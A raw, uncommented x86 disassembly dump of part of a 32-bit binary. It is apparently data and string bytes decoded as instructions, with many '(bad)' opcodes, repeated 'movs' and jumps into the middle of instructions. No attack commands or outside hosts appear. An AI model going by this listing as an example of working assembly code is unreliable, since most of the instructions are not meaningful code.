  4223cc:	xchg   edi,eax
  4223cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ce:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d6:	xor    eax,0x9ba485a4
  4223db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223dc:	mov    ebx,0xd1e2d3a4
  4223e1:	in     al,dx
  4223e2:	xchg   ebp,eax
  4223e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e4:	adc    eax,0x3ba49ba4
  4223e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ea:	popf   
  4223eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ec:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  4223f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f4:	fwait
  4223f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f6:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  4223fd:	sub    al,0xf7
  4223ff:	cs pop ss
  422401:	push   cs
  422402:	adc    eax,0x3a49108
  422407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422408:	fwait
  422409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422412:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241a:	shl    DWORD PTR [edx],cl
  42241c:	shr    DWORD PTR [ecx+esi*8],1
  42241f:	or     al,0xf7
  422421:	push   cs
  422422:	pop    ss
  422423:	outs   dx,BYTE PTR ds:[esi]
  422424:	adc    eax,0x3a49168
  422429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242a:	fwait
  42242b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242c:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422434:	xor    eax,0x9ba48da4
  422439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243a:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  422442:	imul   DWORD PTR [esi+0x17]
  422445:	dec    esi
  422446:	adc    eax,0x37a49148
  42244b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244c:	fwait
  42244d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244e:	jae    0x4223f4
  422450:	popf   
  422451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422452:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	fwait
  42245b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245c:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  422464:	test   DWORD PTR [esi+0x16],0x91a814ae
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	aaa    
  42246d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246e:	fwait
  42246f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422470:	jae    0x422416
  422472:	popf   
  422473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422474:	pop    ss
  422475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422476:	xchg   ebp,eax
  422477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422478:	push   ecx
  422479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247a:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  422481:	inc    edx
  422482:	ror    DWORD PTR [eax+esi*8-0x54],1
  422486:	imul   BYTE PTR [esi-0x77eb71ea]
  42248c:	xchg   ecx,eax
  42248d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248e:	aaa    
  42248f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422490:	fwait
  422491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422492:	jae    0x422438
  422494:	popf   
  422495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422496:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  42249d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249e:	fwait
  42249f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a0:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  4224a7:	mov    esi,?
  4224a9:	mov    ss,WORD PTR [esi]
  4224ab:	out    dx,al
  4224ac:	adc    al,0xe8
  4224ae:	xchg   ecx,eax
  4224af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b0:	aaa    
  4224b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b2:	fwait
  4224b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b4:	jae    0x42245a
  4224b6:	popf   
  4224b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b8:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  4224bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c0:	fwait
  4224c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c2:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  4224ca:	imul   dh
  4224cc:	push   ss
  4224cd:	into   
  4224ce:	adc    al,0xc8
  4224d0:	xchg   ecx,eax
  4224d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d2:	cmp    eax,0x51a49ba4
  4224d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d8:	popf   
  4224d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224da:	jnp    0x422480
  4224dc:	xchg   ebx,eax
  4224dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224de:	fwait
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	xchg   ecx,eax
  4224e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e2:	shl    dl,cl
  4224e4:	shr    ah,1
  4224e6:	lock int3 
  4224e8:	test   dh,0x16
  4224eb:	cs adc al,0x28
  4224ee:	push   ss
  4224ef:	push   cs
  4224f0:	adc    al,0x8
  4224f2:	xchg   ebx,eax
  4224f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f4:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  4224fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fc:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422504:	fwait
  422505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422506:	lea    esp,[edx+edx*8-0xfd32fde]
  42250d:	or     al,0xf6
  42250f:	push   cs
  422510:	push   ss
  422511:	outs   dx,BYTE PTR ds:[esi]
  422512:	adc    al,0x68
  422514:	xchg   ecx,eax
  422515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422516:	add    BYTE PTR [eax],al
  422518:	mov    al,ds:0xac004223
  42251d:	and    eax,0x25b40042
  422522:	inc    edx
  422523:	add    BYTE PTR [edi+eiz*1],bh
  422526:	inc    edx
  422527:	add    BYTE PTR [eax-0x47ffbddd],bl
  42252d:	and    eax,0x7c1a0042
  422532:	inc    edx
  422533:	add    BYTE PTR [edx-0x57ffbd82],dl
  422539:	es inc edx
  42253b:	add    BYTE PTR [edi+eiz*1],ch
  42253e:	inc    edx
  42253f:	add    BYTE PTR [ebp+eiz*1+0x25980042],dl
  422546:	inc    edx
  422547:	add    BYTE PTR [eax],ch
  422549:	daa    
  42254a:	inc    edx
  42254b:	add    ah,bh
  42254d:	and    eax,0xcb4a0042
  422552:	push   es
  422553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422554:	scas   al,BYTE PTR es:[edi]
  422555:	or     al,0x6
  422557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422558:	mov    al,0x25
  42255a:	inc    edx
  42255b:	add    BYTE PTR [eax+0x26],ah
  42255e:	inc    edx
  42255f:	add    BYTE PTR [esi+eiz*1+0x42],dh
  422563:	add    BYTE PTR [eax-0x6fffbdda],al
  422569:	es inc edx
  42256b:	add    al,ch
  42256d:	and    eax,0x239c0042
  422572:	inc    edx
  422573:	add    BYTE PTR [eax],cl
  422575:	es inc edx
  422577:	add    al,bh
  422579:	and    eax,0x27400042
  42257e:	inc    edx
  42257f:	add    BYTE PTR [esi+0x38a4069a],ch
  422585:	inc    ebx
  422586:	out    0xbd,eax
  422588:	sbb    BYTE PTR [esi],ah
  42258a:	inc    edx
  42258b:	add    BYTE PTR [eax],ah
  42258d:	es inc edx
  42258f:	add    BYTE PTR [ebp+eiz*1-0x78dbffbe],bh
  422596:	loopne 0x422555
  422598:	jbe    0x422615
  42259a:	pop    ds
  42259b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42259c:	add    BYTE PTR [eax],al
  42259e:	inc    eax
  42259f:	add    dl,ch
  4225a1:	rcl    dl,cl
  4225a3:	pop    ecx
  4225a4:	(bad)  
  4225a5:	jle    0x4225e9
  4225a7:	add    bl,bl
  4225a9:	outs   dx,DWORD PTR fs:[esi]
  4225ab:	arpl   WORD PTR [edi+0xf],si
  4225ae:	pop    ebx
  4225af:	xor    DWORD PTR [esi-0x5],esi
  4225b2:	(bad)  
  4225b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225b4:	mov    dl,0xc
  4225b6:	xchg   ebx,eax
  4225b7:	test   al,0xa4
  4225b9:	and    eax,0xdaaa0042
  4225be:	push   es
  4225bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c0:	stos   BYTE PTR es:[edi],al
  4225c1:	fiadd  WORD PTR [esi]
  4225c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225c5:	fiadd  DWORD PTR [esi]
  4225c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c8:	mov    ds:0xbea406da,al
  4225cd:	fiadd  DWORD PTR [esi]
  4225cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d0:	mov    edx,0xb6a406da
  4225d5:	fiadd  DWORD PTR [esi]
  4225d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d8:	mov    dl,0xda
  4225da:	push   es
  4225db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225dc:	mov    ds,edx
  4225de:	push   es
  4225df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e0:	mov    bl,dl
  4225e2:	push   es
  4225e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e4:	out    dx,al
  4225e5:	fiadd  DWORD PTR [esi]
  4225e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e8:	dec    DWORD PTR [ebx]
  4225ea:	adc    edi,DWORD PTR [edx]
  4225ec:	xchg   esp,eax
  4225ed:	and    eax,DWORD PTR [edx+0x0]
  4225f0:	test   DWORD PTR [eax],ebp
  4225f2:	inc    edx
  4225f3:	add    BYTE PTR [edi],dl
  4225f5:	loop   0x422580
  4225f7:	js     0x4225a7
  4225f9:	call   0xa4d7:0xcb3aa406
  422600:	and    al,0x75
  422602:	add    BYTE PTR [eax],al
  422604:	nop
  422605:	and    eax,DWORD PTR [edx+0x0]
  422608:	and    al,BYTE PTR [ebx+0x1b]
  42260b:	add    BYTE PTR [eax],0x0
	...
  422616:	add    BYTE PTR [eax],al
  422618:	hlt    
  422619:	clc    
  42261a:	sar    BYTE PTR [ebp+0x319340bf],cl
  422620:	sub    eax,DWORD PTR [edi+0x1f]
  422623:	jle    0x422625
	...
  422649:	add    BYTE PTR [eax],al
  42264b:	add    BYTE PTR [edx],bl
  42264d:	jl     0x422691
	...
  42265b:	add    cl,bh
  42265d:	jmp    0xa48f26a3
  422662:	push   ecx
  422663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422664:	jg     0x42260a
  422666:	inc    edi
  422667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422668:	push   ecx
  422669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266a:	inc    ebx
  42266b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266c:	std    
  42266d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266e:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  422675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422676:	push   ebx
  422677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422678:	dec    ecx
  422679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267a:	std    
  42267b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267c:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  422683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422684:	push   ecx
  422685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422686:	jg     0x42262c
  422688:	std    
  422689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268a:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  422691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422692:	dec    ebx
  422693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422694:	inc    ebx
  422695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422696:	jne    0x42263c
  422698:	pop    ecx
  422699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269a:	jnp    0x422640
  42269c:	dec    ecx
  42269d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269e:	fwait
  42269f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4226a8:	xor    eax,eax
  4226aa:	xor    esp,DWORD PTR [eax]
  4226ac:	xor    eax,DWORD PTR [eax]
  4226ae:	xor    esp,DWORD PTR [eax+0x33]
  4226b1:	inc    eax
  4226b2:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  4226b8:	xor    al,al
  4226ba:	xor    ah,BYTE PTR [eax]
  4226bc:	xor    al,BYTE PTR [eax]
  4226be:	xor    ah,BYTE PTR [eax+0x32]
  4226c1:	inc    eax
  4226c2:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  4226c8:	xor    ecx,esp
  4226ca:	xor    ecx,esi
  4226cc:	xor    ecx,eax
  4226ce:	xor    ecx,edx
  4226d0:	xor    edx,esp
  4226d2:	xor    edx,esi
  4226d4:	xor    edx,eax
  4226d6:	xor    edx,edx
  4226d8:	xor    ebx,esp
  4226da:	xor    ebx,esi
  4226dc:	xor    ebx,eax
  4226de:	xor    ebx,edx
  4226e0:	xor    eax,esi
  4226e2:	push   ebx
  4226e3:	shl    BYTE PTR [ebx-0x40],0x93
  4226e7:	rcl    DWORD PTR [esi-0x56],0x15
  4226eb:	into   
  4226ec:	xchg   ebp,eax
  4226ed:	dec    ecx
  4226ee:	xor    ecx,esp
  4226f0:	sbb    eax,0x50abaae2
  4226f5:	push   0x1e
  4226f7:	cs je  0x42270e
  4226fa:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422700:	imul   edi,edx,0xffffffd5
  422703:	leave  
  422704:	daa    
  422705:	dec    eax
  422706:	out    dx,eax
  422707:	pushf  
  422708:	mov    dh,0xdf
  42270a:	dec    esi
  42270b:	xchg   ebp,eax
  42270c:	lock xor DWORD PTR [esi-0x6c],ebp
  422710:	inc    ebp
  422711:	or     eax,0xc1470876
  422716:	js     0x4226d3
  422718:	popa   
  422719:	pop    ecx
  42271a:	jecxz  0x422787
  42271c:	mov    BYTE PTR [edx-0x56],0x5
  422720:	cs enter 0xaa46,0x44
  422725:	aas    
  422726:	inc    ebp
  422727:	leave  
  422728:	test   BYTE PTR [ebx+0x819a593],0xd8
  42272f:	jl     0x422759
  422731:	mov    es,WORD PTR [edx+0x0]
  422734:	jb     0x422790
  422736:	pop    ss
  422737:	sub    ebx,DWORD PTR [ebp+eiz*1+0x26000042]
  42273e:	inc    edx
  42273f:	add    BYTE PTR [esi-0x5],dh
  422742:	fbld   TBYTE PTR [ebp+0x0]
	...
  422750:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  422756:	popa   
  422757:	arpl   WORD PTR [edi+0x7a],bp
  42275a:	popa   
  42275b:	outs   dx,DWORD PTR ds:[si]
  42275d:	gs ins DWORD PTR es:[edi],dx
  42275f:	jae    0x4227a3
  422761:	outs   dx,DWORD PTR ds:[esi]
  422762:	ins    BYTE PTR es:[edi],dx
  422763:	gs mov cl,0x65
  422766:	in     eax,dx
  422767:	jg     0x4227a2
  422769:	ja     0x4227d4
  42276b:	jp     0x422760
  42276d:	inc    esp
  42276e:	push   0x1b
  422770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422771:	push   ecx
  422772:	dec    esp
  422773:	gs jb  0x4227ef
  422776:	popa   
  422777:	push   ebx
  422778:	jne    0x4227eb
  42277a:	jae    0x4227dd
  42277c:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  422783:	inc    esp
  422784:	(bad)  [edx+0x65]
  422787:	jae    0x4227df
  422789:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  422790:	jb     0x4227f4
  422792:	gs je  0x422768
  422795:	lds    edx,FWORD PTR [eax-0x68]
  422798:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  42279c:	fs jne 0x42280e
  42279f:	push   eax
  4227a0:	gs fs jae 0x422811
  4227a4:	popa   
  4227a5:	ins    DWORD PTR es:[edi],dx
  4227a6:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  4227b9:	add    BYTE PTR [eax],al
  4227bb:	add    BYTE PTR [esp+ecx*4],ch
  4227be:	push   ss
  4227bf:	mov    esi,0x6f4c8773
  4227c4:	jb     0x422834
  4227c6:	jno    0x422831
  4227c8:	or     al,0x36
  4227ca:	lods   al,BYTE PTR ds:[esi]
  4227cb:	repnz push edx
  4227cd:	je     0x42283e
  4227cf:	je     0x422815
  4227d1:	js     0x42278f
  4227d3:	cmc    
  4227d4:	outs   dx,DWORD PTR ds:[esi]
  4227d5:	ins    DWORD PTR es:[edi],dx
  4227d6:	popa   
  4227d7:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  4227de:	popa   
  4227df:	jb     0x422856
  4227e1:	push   0x68736f79
  4227e6:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  4227ed:	mov    ch,0xa5
  4227ef:	jns    0x422864
  4227f1:	outs   dx,DWORD PTR ds:[esi]
  4227f2:	addr16 popa 
  4227f4:	add    BYTE PTR [bp+si],bh
  4227f7:	sub    bh,cl
  4227f9:	icebp  
  4227fa:	gs ins BYTE PTR es:[edi],dx
  4227fc:	jae    0x422846
  4227fe:	popa   
  4227ff:	je     0x422869
  422801:	ins    DWORD PTR es:[edi],dx
  422802:	add    BYTE PTR gs:[bx+si],al
  422806:	in     al,dx
  422807:	mov    ecx,0x414ad1d2
  42280c:	ins    DWORD PTR es:[edi],dx
  42280d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422814:	gs ins DWORD PTR es:[edi],dx
  422816:	add    BYTE PTR [eax],al
  422818:	jne    0x42282a
  42281a:	popa   
  42281b:	or     BYTE PTR [esi+0x73654dbb],al
  422821:	popa   
  422822:	push   0x78000061
  422827:	loope  0x42286b
  422829:	stos   BYTE PTR es:[edi],al
  42282a:	je     0x42288d
  42282c:	push   edi
  42282d:	popa   
  42282e:	jb     0x42289b
  422830:	jae    0x42289d
  422832:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  422839:	loope  0x422807
  42283b:	aad    0x6f
  42283d:	jb     0x4228ab
  42283f:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  422846:	je     0x42285b
  422848:	adc    al,BYTE PTR [ebp+0x77646172]
  42284e:	outs   dx,DWORD PTR ds:[esi]
  42284f:	gs ins DWORD PTR es:[edi],dx
  422851:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  422858:	outs   dx,BYTE PTR ds:[esi]
  422859:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  422860:	ja     0x4228c6
  422862:	outs   dx,DWORD PTR ds:[esi]
  422863:	popa   
  422864:	outs   dx,BYTE PTR ds:[esi]
  422865:	gs jae 0x4228ca
  422868:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  42286f:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  422877:	inc    ebx
  422878:	jb     0x422833
  42287a:	sbb    al,0xd9
  42287c:	jo     0x4228e7
  42287e:	addr16 js 0x4228f6
  422881:	jo     0x4228f8
  422883:	fs add ch,cl
  422886:	xchg   esi,eax
  422887:	in     eax,dx
  422888:	jno    0x4228fb
  42288a:	iret   
  42288b:	jbe    0x422886
  42288d:	or     dh,BYTE PTR [esi-0x3]
  422890:	cwde   
  422891:	int    0xd6
  422893:	std    
  422894:	pop    ebp
  422895:	fsubr  DWORD PTR [edi]
  422897:	dec    edx
  422898:	xor    eax,0xd6cd860a
  42289d:	stc    
  42289e:	inc    ebx
  42289f:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  4228a5:	dec    edx
  4228a6:	sbb    BYTE PTR [ecx+0x52],bh
  4228a9:	mov    ch,al
  4228ab:	jns    0x4228ff
  4228ad:	dec    edx
  4228ae:	sbb    BYTE PTR [ecx+0x6e],bh
  4228b1:	xchg   edx,eax
  4228b2:	cmp    eax,0xcd96c5cb
  4228b7:	in     eax,dx
  4228b8:	jno    0x42292b
  4228ba:	iret   
  4228bb:	jbe    0x4228b6
  4228bd:	or     dh,BYTE PTR [esi-0x3]
  4228c0:	int    0x96
  4228c2:	std    
  4228c3:	pop    ebp
  4228c4:	jns    0x422911
  4228c6:	pop    edx
  4228c7:	xor    eax,0x96cd920a
  4228cc:	stc    
  4228cd:	inc    ebx
  4228ce:	icebp  
  4228cf:	(bad)  
  4228d0:	das    
  4228d1:	int    0x76
  4228d3:	mov    BYTE PTR [ecx+0x6e],bh
  4228d6:	mov    DWORD PTR [edx-0x13749387],esi
  4228dc:	jns    0x42294c
  4228de:	xchg   BYTE PTR [edi-0x3d789187],ah
  4228e4:	retf   
  4228e5:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  4228ec:	jno    0x4228bd
  4228ee:	jbe    0x4228e9
  4228f0:	or     dh,BYTE PTR [esi-0x3]
  4228f3:	int    0x96
  4228f5:	std    
  4228f6:	pop    ebp
  4228f7:	fdiv   DWORD PTR [ebx-0x6df55465]
  4228fd:	int    0x96
  4228ff:	stc    
  422900:	inc    ebx
  422901:	icebp  
  422902:	(bad)  
  422903:	test   BYTE PTR [ecx+0x6e],bh
  422906:	mov    ebp,esp
  422908:	int    0x76
  42290a:	mov    BYTE PTR [ecx+0x6e],bh
  42290d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422914:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42291b:	jno    0x4228ec
  42291d:	jbe    0x422918
  42291f:	or     dh,BYTE PTR [esi-0x3]
  422922:	cwde   
  422923:	int    0xd6
  422925:	std    
  422926:	pop    ebp
  422927:	ret    0x2be4
  42292a:	cmp    DWORD PTR [edx],ecx
  42292c:	xchg   ch,cl
  42292e:	(bad)  
  42292f:	stc    
  422930:	inc    ebx
  422931:	adc    DWORD PTR [eax+0x52794ad6],ebp
  422937:	test   BYTE PTR [ebx-0x78913648],ch
  42293d:	ret    0x79ab
  422940:	xchg   edx,eax
  422941:	aad    0xcb
  422943:	lds    edx,FWORD PTR [esi+0x7171edcd]
  422949:	iret   
  42294a:	jbe    0x422945
  42294c:	or     dh,BYTE PTR [esi-0x3]
  42294f:	int    0x96
  422951:	std    
  422952:	pop    ebp
  422953:	pop    ecx
  422954:	ins    BYTE PTR es:[edi],dx
  422955:	cmp    dh,BYTE PTR ds:0x96cd920a
  42295b:	stc    
  42295c:	inc    ebx
  42295d:	icebp  
  42295e:	(bad)  
  42295f:	push   ebx
  422960:	int    0x76
  422962:	mov    BYTE PTR [ecx+0x6e],bh
  422965:	mov    BYTE PTR [edi+0x47816c79],ah
  42296b:	jns    0x4229db
  42296d:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  422973:	call   0xcded:0xcd965b98
  42297a:	jbe    0x4229b0
  42297c:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  422983:	sbb    al,0x81
  422985:	(bad)  
  422986:	and    al,0x98
  422988:	int    0xd6
  42298a:	adc    al,0x47
  42298c:	mov    ds:0xff8eca62,al
  422991:	add    al,0x7d
  422993:	add    ch,dl
  422995:	lods   eax,DWORD PTR ds:[esi]
  422996:	clc    
  422997:	icebp  
  422998:	jo     0x422964
  42299a:	(bad)  
  42299c:	jge    0x42299e
  42299e:	aad    0xad
  4229a0:	clc    
  4229a1:	icebp  
  4229a2:	jo     0x422936
  4229a4:	adc    ecx,ebp
  4229a6:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  4229ad:	jo     0x422a1f
  4229af:	jo     0x422a21
  4229b1:	jo     0x42294d
  4229b3:	xor    esi,edi
  4229b5:	cwde   
  4229b6:	add    al,0xc
  4229b8:	add    BYTE PTR [ebp-0x80],bl
  4229bb:	xchg   DWORD PTR [eax-0x30522a80],eax
  4229c1:	or     DWORD PTR [eax-0x75],ebx
  4229c4:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  4229cb:	jecxz  0x4229b8
  4229cd:	hlt    
  4229ce:	scas   eax,DWORD PTR es:[edi]
  4229cf:	rol    BYTE PTR [ebp-0x6def4262],0x80
  4229d6:	sub    dl,0xfa
  4229d9:	iret   
  4229da:	pop    eax
  4229db:	iret   
  4229dc:	push   0xffffffcd
  4229de:	out    0xfd,al
  4229e0:	int    0x76
  4229e2:	adc    DWORD PTR [ebx],esi
  4229e4:	out    0x34,al
  4229e6:	sub    ecx,ecx
  4229e8:	or     dh,BYTE PTR [esi-0x43]
  4229eb:	rol    BYTE PTR [eax-0x7f6d1243],1
  4229f1:	sub    BYTE PTR [edi],0x6
  4229f4:	sub    DWORD PTR [eax-0x72357f80],eax
  4229fa:	cmc    
  4229fb:	sub    esp,esi
  4229fd:	in     eax,dx
  4229fe:	aad    0xe9
  422a00:	add    ebx,ebp
  422a02:	mov    bh,dh
  422a04:	fcmovnbe st,st(5)
  422a06:	out    dx,eax
  422a07:	pushf  
  422a08:	xchg   edi,edi
  422a0a:	test   al,0xcf
  422a0c:	fs adc ebx,0xffffffe9
  422a10:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a14:	iret   
  422a15:	int3   
  422a16:	call   0x80c278df
  422a1b:	jno    0x4229b5
  422a1d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422a27:	int    0xe6
  422a29:	std    
  422a2a:	xor    esp,esi
  422a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a2d:	das    
  422a2e:	pop    ecx
  422a2f:	push   0xffffffcd
  422a31:	(bad)  
  422a32:	or     eax,0xfcde9e3
  422a37:	sub    edi,eax
  422a39:	xchg   DWORD PTR [edi],ecx
  422a3b:	iret   
  422a3c:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422a42:	add    BYTE PTR [eax-0x102c8233],0x88
  422a49:	add    al,0xf2
  422a4b:	add    DWORD PTR [ebx+0x2],0x80818069
  422a52:	adc    dh,0x4e
  422a55:	inc    ebx
  422a56:	jns    0x4229da
  422a58:	fldlg2 
  422a5a:	es int 0xc6
  422a5d:	or     eax,0x809221bd
  422a62:	add    al,0x81
  422a65:	mov    al,ds:0xfb87d287
  422a6a:	add    al,0xbd
  422a6c:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422a73:	jns    0x422a42
  422a75:	ins    DWORD PTR es:[edi],dx
  422a76:	and    ch,0xa0
  422a79:	push   edx
  422a7a:	add    al,0x3
  422a7c:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422a82:	push   edx
  422a83:	add    al,0x3
  422a85:	push   ebx
  422a86:	mov    al,cl
  422a88:	test   bh,bh
  422a8a:	retf   
  422a8b:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422a93:	(bad)  
  422a94:	in     al,dx
  422a95:	outs   dx,DWORD PTR ds:[esi]
  422a96:	rcl    bl,1
  422a98:	(bad)  
  422a99:	jge    0x422a58
  422a9b:	outs   dx,DWORD PTR ds:[esi]
  422a9c:	xchg   edx,eax
  422a9d:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422aa4:	sahf   
  422aa5:	mov    al,ds:0x3454009e
  422aaa:	jno    0x422b0e
  422aac:	popa   
  422aad:	mov    ah,0x86
  422aaf:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422ab6:	push   cs
  422ab7:	(bad)  
  422ab8:	jge    0x422a77
  422aba:	push   eax
  422abb:	xchg   edx,eax
  422abc:	add    BYTE PTR [eax+0x2d048d6],0xff
  422ac3:	jge    0x422a82
  422ac5:	push   ss
